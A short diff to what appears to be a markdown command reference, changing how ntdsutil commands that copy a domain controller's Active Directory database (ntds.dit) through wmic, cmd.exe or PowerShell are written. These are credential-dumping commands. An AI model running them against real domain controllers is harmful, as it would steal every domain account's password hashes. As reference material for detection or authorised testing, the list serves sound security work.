@@ -326,8 +326,8 @@ wmic process call create "ntdsutil \"ac i ntds\" ifm \"create full <file_path>
 wmic process call create "ntdsutil \"activate instance ntds\" ifm \"create full <file_path>
 wmic process call create "cmd.exe /c ntdsutil \"ac i ntds\" ifm \"create full <file_path>
 wmic process call create "cmd.exe /c mkdir <file_path> & ntdsutil \"ac i ntds\" ifm \"create full <file_path>
-PowerShell ntdsutil.exe 'ac i ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
-PowerShell ntdsutil.exe 'activate instance ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
+ntdsutil.exe 'activate instance ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
 ```
 <br>
 
